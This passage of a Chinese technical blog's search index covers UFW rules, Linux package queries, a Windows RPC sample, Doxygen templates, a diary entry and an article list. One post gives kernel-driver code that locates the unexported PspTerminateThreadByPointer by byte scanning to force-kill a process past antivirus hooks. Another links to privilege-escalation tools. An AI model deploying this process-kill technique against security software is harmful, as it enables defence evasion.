您还可以使用其他选项指定源地址，目标地址和应用程序。 限制IP访问除了端口，还可以使用UFW限制对特定IP的访问。例如，要拒绝来自IP地址为192.168.1.100的所有连接： 1$ sudo ufw deny from 192.168.1.100 或者，要允许仅该IP地址访问您的网站： 1$ sudo ufw allow from 192.168.1.100 to any port 80 修改默认策略您可以通过修改默认策略来更改UFW的行为。要允许所有传入连接并拒绝所有传出连接： 1$ sudo ufw default deny outgoing 1$ sudo ufw default allow incoming 或者，要拒绝所有传入连接并允许所有传出连接： 1$ sudo ufw default allow outgoing 1$ sudo ufw default deny incoming 撤消规则如果您需要删除规则，可以使用以下命令： 1$ sudo ufw delete [规则号] 规则号是规则列表中的数字序号，从1开始。 禁用UFW要禁用UFW并删除所有规则，可以使用以下命令： 1$ sudo ufw disable 1$ sudo ufw reset 结论在Linux上使用UFW可以轻松实现防火墙和安全策略。UFW提供了一种简单的方式来控制入站和出站流量，并且易于使用和配置。通过设置良好的规则，可以增强系统的安全性。","tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"防火墙","slug":"防火墙","permalink":"http://example.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Command&Tools","slug":"A-OS/Linux/Command-Tools","permalink":"http://example.com/categories/A-OS/Linux/Command-Tools/"}]},{"title":"Linux查询是否安装了某个软件","date":"2023-10-27T01:24:01.837Z","path":"A_OS/Linux/Command&Tools/Linux查询是否安装某个软件/","text":"1、rpm包安装的，可以用rpm -qa看到，如果要查找某软件包是否安装，用 rpm -qa | grep “软件或者包的名字”。 1rpm -qa | grep ruby 2、以deb包安装的，可以用dpkg -l能看到。如果是查找指定软件包，用dpkg -l | grep “软件或者包的名字”； 1dpkg -l | grep ruby 3、yum方法安装的，可以用yum list installed查找，如果是查找指定包，命令后加 | grep “软件名或者包名”； 1yum list installed | grep ruby","tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"查询","slug":"查询","permalink":"http://example.com/tags/%E6%9F%A5%E8%AF%A2/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Command&Tools","slug":"A-OS/Linux/Command-Tools","permalink":"http://example.com/categories/A-OS/Linux/Command-Tools/"}]},{"title":"【windows】通过PID获取进程打开的端口","date":"2023-10-26T16:00:00.000Z","path":"A_OS/Windows/【win】通过PID获取进程打开的端口/","text":"1","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【RPC】调用过程实例详解","date":"2023-10-26T01:45:19.019Z","path":"A_OS/Windows/RPC/【RPC】调用过程实例详解/","text":"概述：windows 创建 RPC调用过程实例详解 [toc] 0x01、生成 UUID 和模版(IDL)文件定义接口的第一步是使用 uuidgen 实用工具生成通用唯一标识符（UUID）。UUID使客户端和服务端能够相互识别。该工具包含在阿庄平台软件开发工具包中（SDK）。 一般安装路径位于：D:\\Windows Kits\\10\\bin\\10.0.22621.0\\x64 以下命令生成 UUID 并创建名为 Hello.idl 的模版文件。 1uuidgen /i /ohello.idl 模版内容大致如下： 12345678[ uuid(7a98c250-6808-11cf-b73b-00aa00b677a7), version(1.0)]interface hello&#123; &#125; 在模版中添加接口： 12345678910//file hello.idl[ uuid(7a98c250-6808-11cf-b73b-00aa00b677a7), version(1.0)]interface hello&#123; void HelloProc([in, string] unsigned char * pszString); void Shutdown(void);&#125; 0x02、添加 acf 文件acf文件内容如下所示，导出接口需要与 idl 文件一致： 1234567//file: hello.acf[ implicit_handle (handle_t hello_IfHandle)] interface hello&#123;&#125; 0x03、编译 idl 文件 打开 visual studio，新建一个空项目 空项目中添加上述 idl文件 和 acf文件 编译项目 生成 hello_h.h、hello_c.c、hello_s.c hello_h.h: 服务端和客户端共用文件 hello_c.c: 客户端文件 hello_s.c: 服务端文件 需要补充说明的是，在 hello_h.h 头文件中有两个导出接口，导出接口即为rpc调用的接口。 12extern RPC_IF_HANDLE hello_v1_0_c_ifspec;extern RPC_IF_HANDLE hello_v1_0_s_ifspec; 包含函数函数MIDL_user_allocate和MIDL_user_free用于为RPC存根分配和释放内存。 MIDL_user_allocate和MIDL_user_free在实现RPC应用程序时，它们必须在应用程序的某个地方定义,这里直接在主文件定义即可。 12345678910//在客户端和服务端实现中都要包含这两个函数void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)&#123; return(malloc(len));&#125;void __RPC_USER midl_user_free(void __RPC_FAR *ptr)&#123; free(ptr);&#125; 0x04、客户端新建工程文件如下所示： clientrpc.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293//client.cpp#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;#include &quot;hello_h.h&quot;#pragma comment(lib,&quot;Rpcrt4.lib&quot;)void doRpcCall();int main(int argc, char** argv)&#123; int i = 0; RPC_STATUS status = 0; unsigned char* pszNetworkAddr = NULL; unsigned char* pszStringBinding = NULL; for (i = 1; i &lt; argc; i++) &#123; if (strcmp(argv[i], &quot;-ip&quot;) == 0) &#123; pszNetworkAddr = (unsigned char*)argv[++i]; break; &#125; &#125; status = RpcStringBindingCompose(NULL, (unsigned char*)&quot;ncacn_np&quot;, pszNetworkAddr, (unsigned char*)&quot;\\\\pipe\\\\hello&quot;, NULL, &amp;pszStringBinding); if (status != 0) &#123; cout &lt;&lt; &quot;RpcStringBindingCompose returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; return -1; &#125; cout &lt;&lt; &quot;pszStringBinding = &quot; &lt;&lt; pszStringBinding &lt;&lt; endl; status = RpcBindingFromStringBinding(pszStringBinding, &amp;hello_IfHandle); if (status != 0) &#123; cout &lt;&lt; &quot;RpcBindingFromStringBinding returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; return -1; &#125; doRpcCall(); status = RpcStringFree(&amp;pszStringBinding); if (status != 0) cout &lt;&lt; &quot;RpcStringFree returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; status = RpcBindingFree(&amp;hello_IfHandle); if (status != 0) cout &lt;&lt; &quot;RpcBindingFree returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; cin.get(); return 0;&#125;void doRpcCall(void)&#123; char buff[1024]; RpcTryExcept&#123; while (true) &#123; cout &lt;&lt; &quot;Please input a string param for Rpc call:&quot; &lt;&lt; endl; cin.getline(buff, 1023); if (strcmp(buff, &quot;exit&quot;) == 0 || strcmp(buff, &quot;quit&quot;) == 0) &#123; Shutdown(); &#125; else &#123; HelloProc((unsigned char*)buff); cout &lt;&lt; &quot;call helloproc succeed!&quot; &lt;&lt; endl; &#125; &#125; &#125; RpcExcept(1) &#123; unsigned long ulCode = RpcExceptionCode(); cout &lt;&lt; &quot;RPC exception occured! code: &quot; &lt;&lt; ulCode &lt;&lt; endl; &#125; RpcEndExcept&#125;void* __RPC_USER MIDL_user_allocate(size_t len)&#123; return (malloc(len));&#125;void __RPC_USER MIDL_user_free(void* ptr)&#123; free(ptr);&#125; 0x05、服务端新建工程文件如下所示： serverrpc.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;using namespace std;#include &quot;hello_h.h&quot;#pragma comment(lib,&quot;Rpcrt4.lib&quot;)int main(void)&#123; RPC_STATUS status = 0; unsigned int mincall = 1; unsigned int maxcall = 20; status = RpcServerUseProtseqEp( (unsigned char*)&quot;ncacn_np&quot;, maxcall, (unsigned char*)&quot;\\\\pipe\\\\hello&quot;, NULL); if (status != 0) &#123; cout &lt;&lt; &quot;RpcServerUseProtseqEp returns: &quot; &lt;&lt; status &lt;&lt; endl; return -1; &#125; status = RpcServerRegisterIf( hello_v1_0_s_ifspec, NULL, NULL); if (status != 0) &#123; cout &lt;&lt; &quot;RpcServerRegisterIf returns: &quot; &lt;&lt; status &lt;&lt; endl; return -1; &#125; cout &lt;&lt; &quot;Rpc Server Begin Listening...&quot; &lt;&lt; endl; status = RpcServerListen(mincall, maxcall, FALSE); if (status != 0) &#123; cout &lt;&lt; &quot;RpcServerListen returns: &quot; &lt;&lt; status &lt;&lt; endl; return -1; &#125; cin.get(); return 0;&#125;/************************************************************************//* MIDL malloc &amp; free *//************************************************************************/void* __RPC_USER MIDL_user_allocate(size_t len)&#123; return (malloc(len));&#125;void __RPC_USER MIDL_user_free(void* ptr)&#123; free(ptr);&#125;/************************************************************************//* Interfaces *//************************************************************************/void HelloProc(unsigned char* szhello)&#123; cout &lt;&lt; szhello &lt;&lt; endl;&#125;void Shutdown(void)&#123; RPC_STATUS status = 0; status = RpcMgmtStopServerListening(NULL); if (status != 0) &#123; cout &lt;&lt; &quot;RpcMgmtStopServerListening returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; &#125; status = RpcServerUnregisterIf(NULL, NULL, FALSE); if (status != 0) &#123; cout &lt;&lt; &quot;RpcServerUnregisterIf returns: &quot; &lt;&lt; status &lt;&lt; &quot;!&quot; &lt;&lt; endl; &#125;&#125; 0x06、编译并运行分别编译客户端和服务端程序，得到 server.exe 和 client.exe 先运行 server.exe 在 client.exe 目录运行 client -ip 192.168.106.128 来启动客户端程序并与服务器端相连 在 client 的窗口输入任意字符串，回车后可看到server窗口上有显示 在 client 窗口内 输入 exit 或 quit, server 窗口关闭 0x07、运行示例Client Server","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"RPC","slug":"RPC","permalink":"http://example.com/tags/RPC/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"http://example.com/categories/A-OS/Windows/RPC/"}]},{"title":"【windows】PsTerminateProcess 结束进程","date":"2023-10-25T16:00:00.000Z","path":"A_OS/Windows/【win】PsTerminateProcess 结束进程/","text":"概述：使用 PsTerminateProcess 结束进程 参考文章： PsTerminateProcess结束进程 - gussing - 博客园 [原创]强制关闭进程的两种方法-编程技术-看雪-安全社区|安全招聘|kanxue.com 使用 PspTerminateThreadByPointer 强制结束进程-CSDN博客 PspTerminateProcess未文档化函数导出终止进程 - zpchcbd - 博客园 0x01 PsTerminateProcess 说明定义及实现PsTerminateProcess 函数用于结束一个进程。其声明如下所示： 123NTSTATUSNTAPIPsTerminateProcess(IN PEPROCESS Process, IN NTSTATUS ExitStatus) 其中第一个参数是 PEPROCESS 的指针，如果你只知道pid，可以通过 PsLookupProcessByProcessId 获得，而第二个参数指定退出状态码。 PsTerminateProcess 函数的实现非常简单，就是调用了 PspTerminateProcess PsTerminateProcess 的实现 12345678NTSTATUSNTAPIPsTerminateProcess(IN PEPROCESS Process, IN NTSTATUS ExitStatus)&#123; /* Call the internal API */ return PspTerminateProcess(Process, ExitStatus);&#125; PsTerminateProcess 是一个导出函数，而 PspTerminateProcess 是一个内部函数。也就是说，你只要包含的正确的头文件，就可以使用 PsTerminateProcess 杀掉一个进程，而想用 PspTerminateProcess 你就得多费点时间把它的函数地址找出来。所以为安全起见，大多数的&#x3D;&#x3D;杀毒软件&#x3D;&#x3D;都有hook住 PsTerminateProcess，&#96;&#96;PspTerminateProcess&#96; 就不一定了。 如下所示为 PsTerminateProcess 的反汇编代码： 123456789101112131415kd&gt; u PsTerminateSystemThread L10nt!PsTerminateSystemThread:805d3594 8bff mov edi,edi805d3596 55 push ebp805d3597 8bec mov ebp,esp805d3599 64a124010000 mov eax,dword ptr fs:[00000124h]805d359f f6804802000010 test byte ptr [eax+248h],10h805d35a6 7507 jne nt!PsTerminateSystemThread+0x1b (805d35af)805d35a8 b80d0000c0 mov eax,0C000000Dh805d35ad eb09 jmp nt!PsTerminateSystemThread+0x24 (805d35b8)805d35af ff7508 push dword ptr [ebp+8]805d35b2 50 push eax805d35b3 e828fcffff call nt!PspTerminateThreadByPointer (805d31e0)805d35b8 5d pop ebp805d35b9 c20400 ret 4 这里的 e82bfcffff 可以作为特征码。 PspTerminateProcess 函数函数定义1234NTSTATUS PspTerminateProcess( EPROCESS pEprocess, NTSTATUS ExitCode); 参数 说明 pEprocess 要关闭的进程的EPROCESS ExitCode 进程的退出码 由于这个函数是未导出的，所以不能直接调用，要先在内存中找到这个函数才可以调用。这里选择找到这个函数的办法是通过内核模块遍历的办法来查找这个函数。 函数实现PspTerminateProcess 函数实现如下所示： 123456789101112131415PETHREAD Thread;NTSTATUS Status = STATUS_NOTHING_TO_TERMINATE;PAGED_CODE();PSTRACE(PS_KILL_DEBUG, &quot;Process: %p ExitStatus: %p\\n&quot;, Process, ExitStatus);PSREFTRACE(Process);/* Check if this is a Critical Process */if (Process-&gt;BreakOnTermination)&#123; /* Break to debugger */ PspCatchCriticalBreak(&quot;Terminating critical process 0x%p (%s)\\n&quot;, Process, Process-&gt;ImageFileName);&#125; 先是检查是否有调试器挂在上面并且要求退出进程时中断到调试器，如果需要则调用 PspCatchCriticalBreak 中断过去。PspCatchCriticalBreak 的实现我总觉得应该是ReactOS 里调内核的临时做法，NT内核应该不是这么干的，所以暂时略过不看。（其实逻辑很简单，一眼就能扫明白），接着看 PspTerminateProcess： 123456789101112131415/* Set the delete flag */InterlockedOr((PLONG)&amp;Process-&gt;Flags, PSF_PROCESS_DELETE_BIT);然后调用如下方法在Flags域里置位，标明自己已经结束/* Get the first thread */Thread = PsGetNextProcessThread(Process, NULL);while (Thread)&#123; /* Kill it */ PspTerminateThreadByPointer(Thread, ExitStatus, FALSE); Thread = PsGetNextProcessThread(Process, Thread); /* We had at least one thread, so termination is OK */ Status = STATUS_SUCCESS;&#125; 接着就是最关键的一步：先找到进程下的第一个线程，然后顺着线程列表访问所有的线程，调用 PspTerminateThreadByPointer 结束它。等所有的线程都退出的时候，进程自然也就消亡了（最后一个线程退出时负责干掉进程）。 PsGetNextProcessThread 是在 EPROCESS 结构 ThreadListHead 指向的线程列表里遍历，程序很简单。有趣的是 PspTerminateThreadByPointer 函数，这是结束线程的核心程序。程序主体在我手头的ReactOS里没有，泄露的nt4代码看过但又不便贴出，所以只能略说：大致的做法就是生成一个APC插入到目标线程里，而该APC所作的事情就是调用 PspExitThread 退出。 关于APC的详细内容请看这里。相信有心的筒子完全有能力自己山寨一个 PspTerminateThreadByPointer 出来。 PspTerminateProcess所作的最后一件事情呢，就是检测是否真有线程被结束，如果根本就没有这样的线程，那还得自己负责把句柄表里表示自己的那一项清掉： 123456/* Check if there was nothing to terminate or if we have a debug port */if ((Status == STATUS_NOTHING_TO_TERMINATE) || (Process-&gt;DebugPort))&#123; /* Clear the handle table anyway */ ObClearProcessHandleTable(Process);&#125; 但凡有追求一点的杀软呢，这里面的绝大多数函数比如 PsTerminateProcess，&#96;&#96;PspTerminateProcess和PspTerminateThreadByPointer&#96; 等都会有hook住，防止有人干坏事。强势一点的连APC相关的操作也要hook住。 如何查找 PspTerminateProcess1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;ntifs.h&gt; typedef NTSTATUS(*pfnPspTerminateThreadByPointer)(PETHREAD pEThread, NTSTATUS ntExitCode, BOOLEAN bDirectTerminate); VOID DriverUnload(IN PDRIVER_OBJECT driverObject);PVOID FindTargetFunc(); // 寻找函数地址PEPROCESS PsGetThreadProcess(PETHREAD pEThraed); // 根据EPROCESS得到EPROCESS ULONG g_uPID = 176; // 要关闭的进程PID NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath)&#123; NTSTATUS status = STATUS_SUCCESS; PETHREAD pEThread = NULL; PEPROCESS pEProcess = NULL, pThreadProcess = NULL; ULONG uThreadId = 0; pfnPspTerminateThreadByPointer PspTerminateThreadByPointer = NULL; PspTerminateThreadByPointer = (pfnPspTerminateThreadByPointer)FindTargetFunc(); if (PspTerminateThreadByPointer == NULL) &#123; goto exit; &#125; //获取要关闭的进程的EPROCESS status = PsLookupProcessByProcessId((HANDLE)g_uPID, &amp;pEProcess); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;PsLookupProcessByProcessId Error 0x%X\\r\\n&quot;, status); goto exit; &#125; // 遍历所有线程 for (uThreadId = 4; uThreadId &lt; 0x8000; uThreadId += 4) &#123; status = PsLookupThreadByThreadId((HANDLE)uThreadId, &amp;pEThread); if (NT_SUCCESS(status)) &#123; // 获取线程对应的进程结构对象 pThreadProcess = PsGetThreadProcess(pEThread); if (pThreadProcess == pEProcess) &#123; PspTerminateThreadByPointer(pEThread, 0, 1); DbgPrint(&quot;成功关闭线程\\r\\n&quot;); &#125; ObDereferenceObject(pEThread); &#125; &#125; ObDereferenceObject(pEProcess); driverObject-&gt;DriverUnload = DriverUnload;exit: return STATUS_SUCCESS;&#125; VOID DriverUnload(IN PDRIVER_OBJECT driverObject)&#123; DbgPrint(&quot;驱动卸载完成\\r\\n&quot;);&#125; PVOID FindTargetFunc()&#123; PVOID pFunAddr = NULL; PUCHAR pPsTerminateSystemThreadAddr = NULL; UNICODE_STRING uStrFuncName = RTL_CONSTANT_STRING(L&quot;PsTerminateSystemThread&quot;); pPsTerminateSystemThreadAddr = (PUCHAR)MmGetSystemRoutineAddress(&amp;uStrFuncName); while (MmIsAddressValid(pPsTerminateSystemThreadAddr) &amp;&amp; *pPsTerminateSystemThreadAddr != 0xC2) &#123; if (*pPsTerminateSystemThreadAddr == 0xE8) &#123; pFunAddr = (PVOID)((ULONG)pPsTerminateSystemThreadAddr + 5 + *(PULONG)(pPsTerminateSystemThreadAddr + 1)); break; &#125; pPsTerminateSystemThreadAddr++; &#125; return pFunAddr;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【Visual Studio】Doxygen注释.md","date":"2023-10-25T16:00:00.000Z","path":"A_OS/Windows/Visual Studio/【Visual Studio】Doxygen注释/","text":"概述： Doxygen 注释及使用 C++版 参考文章： Doxygen Manual: Documenting the code Doxygen - 治好了我的代码注释强迫症 - 知乎 Doxygen 注释语法和使用-CSDN博客 这里展示一些常用到的文件注释 0x01 文件头1234567891011/** * @file 文件名 * @brief 简介 * @details 细节 * @mainpage 工程概览 * @author 作者 * @email 邮箱 * @version 版本号 * @date 年-月-日 * @license 版权 */ 0x02 函数头12345678910111213/** * @brief 函数简介 * @detail 详细说明 * * @param 形参 参数说明 * @param 形参 参数说明 * @return 返回说明 * @retval 返回值说明 * @note 注解 * @attention 注意 * @warning 警告 * @exception 异常 */ 0x03 类定义1234/*** @brief 类的简单概述* 类的详细概述*/ 0x04 批注12345678/*!&lt; ... 批注 ... *//**&lt; ... 批注 ... */ （推荐）//!&lt; ... 批注 ...///&lt; ... 批注 ... （推荐） Example:using apollo::common::ErrorCode; ///&lt;错误码using apollo::common::Status; ///&lt;状态 0x05 API 注释12345678910111213141516171819202122232425262728/* GLOBAL FUNCTIONS *//** * @brief Example showing how to document a function with Doxygen. * * Description of what the function does. This part may refer to the parameters * of the function, like @p param1 or @p param2. A word of code can also be * inserted like @c this which is equivalent to &lt;tt&gt;this&lt;/tt&gt; and can be useful * to say that the function returns a @c void or an @c int. If you want to have * more than one word in typewriter font, then just use @&lt;tt@&gt;. * We can also include text verbatim, * when the language is not the one used in the current source file (but * &lt;b&gt;be careful&lt;/b&gt; as this may be supported only by recent versions * of Doxygen). By the way, &lt;b&gt;this is how you write bold text&lt;/b&gt; or, * if it is just one word, then you can just do @b this. * * @param [in] param1 Description of the first parameter of the function. * @param [out] param2 The second one, which follows @p param1, and represents output. * * @return Describe what the function returns. * @retval XXX_OK if successful. * * @see doxygen_theSecondFunction * @see Box_The_Last_One * @see &lt;http://website/&gt; * @note Something to note. * @warning Warning. */int doxygen_theFirstFunction(int param1, int param2); 0x06 结构体注释1234567891011/** * @brief Use brief, otherwise the index won&#x27;t have a brief explanation. * * Detailed explanation. */typedef struct BoxStruct&#123; int a; /**&lt; Some documentation for the member BoxStruct#a. */ int b; /**&lt; Some documentation for the member BoxStruct#b. */ double c; /**&lt; Etc. */&#125; tBoxStruct; 0x07 版权声明123/***************************************************************************** * Portfolio Info ****************************************************************************/","tags":[{"name":"Visual Studio","slug":"Visual-Studio","permalink":"http://example.com/tags/Visual-Studio/"},{"name":"Doxygen","slug":"Doxygen","permalink":"http://example.com/tags/Doxygen/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"http://example.com/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"【RPC】漏洞","date":"2023-10-08T06:01:23.607Z","path":"A_OS/Windows/RPC/【RPC】漏洞/","text":"0Day 漏洞指路： crisprss&#x2F;PetitPotam: 替代PrintBug用于本地提权的新方式，主要利用MS-EFSR协议中的接口函数 借鉴了Potitpotam中对于EFSR协议的利用,实现了本地提权的一系列方式 Drawing on the use of the EFSR protocol in Potitpotam, a series of local rights escalation methods have been realized crisprss&#x2F;magicAzureAttestService: 针对于AzureAttestService服务的本地提权Eop，微软表示已经进行修复 相关分析： postman rpc本地调用_尝试进行RPC漏洞挖掘-CSDN博客 如何挖掘RPC漏洞（Part 1）-安全客 - 安全资讯平台 RPC调试： Windbg系列-RPC调试 | Anhkgg’Lab | Windows Kernel | Rootkit | Reverse Engineer | Expolit | 内核研究 | 逆向分析 | 漏洞分析挖掘 拓展阅读： 访问令牌：【windows 访问控制】一、访问令牌 - 小林野夫 - 博客园 Windows Access Token提权 - zpchcbd - 博客园","tags":[{"name":"RPC","slug":"RPC","permalink":"http://example.com/tags/RPC/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"http://example.com/categories/A-OS/Windows/RPC/"}]},{"title":"释怀","date":"2023-09-18T05:27:41.901Z","path":"diary/释怀/","text":"真正的成熟，大概就是，喜欢的东西还是喜欢，只是不再强求拥有了，害怕的东西还是害怕，只是敢于面对了。 成长的意义就在于，总有一天，我们要学会坦然面对生命中所有突如其来的境遇。 有的人离开，有的人走来，有的人重逢，有的人再也不见。 太阳照常升起，草木岁岁枯荣。 所有的舍不得，所有的无奈，都有释怀的一天。 你一个人，过得好吗？努力生活，就是答案。 人这一辈子，有人羡慕你，有人看不起你，有人误会你，有人讨厌你，也有人嫉妒你，不要在乎别人怎么看你。 一定要告诉自己，身体是自己的，一定要爱惜，心情也是自己的，一定要顾及，不要为了那些不值得的人和事为难自己。 把身体养好，叫体质，把心情调好，叫格局，把日子过好，叫本事。 现在这个社会，当面一套背后一套，口是心非的人多了去了，所以做好自己就行，剩下的交给良心！ 有些东西，得之我幸，失之我命，选择放下，不是为了原谅别人，只是为了放过自己。 记得有人说过，一个人首先要爱自己，才有能力爱别人。","tags":[],"categories":[{"name":"diary","slug":"diary","permalink":"http://example.com/categories/diary/"}]},{"title":"","date":"2023-09-18T05:27:41.860Z","path":"index/","text":"学习|记录|分享 🤗🙂🤩🤔🤨😗🥰😘😀😁😂🤣😃😄😅😆😗🥰😘😍😎😋😊😉😙😚😐😑😶🙄🙂🤗😏🤩😣🤔😥🤨😮😛😌😴😫🥱😪😯🤐😜😝🤤😒😓😔😕🙃🤑😲☹🙁😞😖😟😤😬🤯😩😨😧😦😭😢😰😱🥵🥶😳🤪😵🥴🤮🤢🤕🤒😷🤬😡😠🤧😇🥳🥺🤠🤡🤥🤫💀👺👹👿😈🤓🧐🤭☠👻👽👾🤖💩😺😸🐱‍👤😾😿🙀😽😼😻😹 个人维护的wiki，涉及工作、学习中用到的技术和方案以及工具 我的简历 📚 文章列表 👉 Xmind文件 🎵 音乐 🎨 封面 🔎 资源 🎨 UML 📺 Code","tags":[],"categories":[]},{"title":"文章汇总","date":"2023-09-18T05:27:41.860Z","path":"readme/","text":"🏠 返回 Qt Qt 鼠标 hover 操作时弹出文字气泡 Qt Http 下载（转载） png和jpg格式的图片(二) Qt 重启 Qt 圆形进度条 Qt动画类 Qt获取控件位置 Qt 截图 Qt在Win系统上的消息通知 Qt 自定义气泡 Qt插件——使用 QtCipherSqlitePlugin 对数据库进行加密 Qt常用基础代码汇总 QListWidget 用法整理 【一文搞懂】qss 使用 QWebEngineView 加载网页慢的问题 窗体不显示或半透明 QTableWidget 遍历 Qt窗口适配系统缩放 QLineEdit 修改部分文本样式 QStackWidget动画2 Qt 因为槽函数问题或者逻辑问题导致重复new问题解决办法及建议 Qt任务栏显示进度条 QStackWidget动画（1） Qt 启动动画 Qt 动画效果 （抖动、下坠、透明度） Qt事件过滤器（eventFilter） Qt图片旋转 Qt 窗口居中显示 Qt实现窗口拖拽 Qt 国际化 Linux Linux RPC Linux查询是否安装了某个软件 5 环境变量与文件查找 Linux基础入门15 Linux进程概念 Linux内核2 跟踪分析Linux内核的启动过程 ls命令详解 Linux 内核分析配套实验 linux 内核1 完成一个简单的时间片轮转躲到程序内核代码 工具 Readme 工具使用手册 自动生成 readme 文档 Windows Procmon 过滤用法 Win7 使用未签名驱动程序 FormatMessage函数的使用 Windows聚焦不更新 监控系统事件（网卡） winuser说明 cmd——route 热补丁支持 网络连接事件 监控路由事件 一个完整的wfp驱动 提权工具 psExec.exe 批处理获取ip到剪切板 服务中以管理员&#92;普通权限启动进程 Windows 降权 使用 UMDH 定位用户模式内存泄漏 iphepler 接口整理 提权 监控指定网卡事件 C++ 通过 COM 组件 启用&#92;禁用&#92;查看 网卡状态 操作网卡类 监控网卡事件 使用 winsock2 相关函数 加载动态库 (loadlibrary) windows 查看进程启动参数命令行 【管道】（二） 管道通信 【管道】（一） 初识管道 其他 字符串类型转换整理(char、TCHAR、string、wstring、CString、WCHAR) 密钥分配 第7章 网络安全 常用写法整理 内存泄漏分析实战 友元 UML 片段说明 配置多个账号 3-hexo 主题快捷键 函数声明 &lt;2&gt; const 关键字 &lt;3&gt; 确定对象使用前初始化 返回值类型的规范 &lt;4&gt; 了解C++默认创建并调用的函数 OSI参考模型 三黑豆浆 C++ 枚举 typora bluebook 自定义修改主题代码 tcp.flags 说明 Xcode 下载与安装 UnSplash 获取随机图片的API 系统锁 管道demo libevent——evconnlistener_new_bind(1) 《深入理解Windows操作系统》一书附录中英语单词整理 Curl 请求 Https 正则表达式反向引用 切换shell IPv6 socket 长连接 TCP&#x2F;IP的四元组、五元组、七元组 Curl使用的一些demo，记录 临时文件 png和jpg格式的图片(一) 自然辩证法 QAction Icon 大小问题 文件大小换算方法 GO HACK PE文件分析 try-catch块 Lambda表达式 using 用法整理 动态声明子类 各种宏定义用法整理 文件后缀校验 Json11 C++ 用法总结 ⏰ 时间处理 visual studio 编译告警常见处理手段 TypeScript 中国马克思主义科学技术观 TODO using 用法整理 动态声明子类 各种宏定义用法整理 文件后缀校验 【不敢说一文搞懂】VLD 内存泄漏定位 共享文件夹 libevent http server OSI七层网络协议模型各层协议 音频房间创建及连接说明 声网参赛经历记录——白板插件开发(前端) 手册 代码规范 git emoji手册 Typora Emoji Visual Assist 快捷键整理 前端样式配置 style 常用变量名缩写 写作协作手册 Git 速查手册 常见编程命名缩写 编程常用英语词汇 winDbg 调试手册 英雄联盟语录 随机字符串 SQLite3 数据库加密 脚本 Wiki自动更新脚本 CPP C++ 常见错误——无法解析的外部符号","tags":[],"categories":[]}],"categories":[{"name":"B_书籍资料","slug":"B-书籍资料","permalink":"http://example.com/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/"},{"name":"软件设计师","slug":"B-书籍资料/软件设计师","permalink":"http://example.com/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/"},{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"},{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POC探索","slug":"A-内功/A-POC探索","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"Exchange","slug":"A-内功/A-POC探索/Exchange","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/Exchange/"},{"name":"SQL注入","slug":"A-内功/A-POC探索/SQL注入","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/"},{"name":"畅捷通","slug":"A-内功/A-POC探索/畅捷通","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"},{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Visual 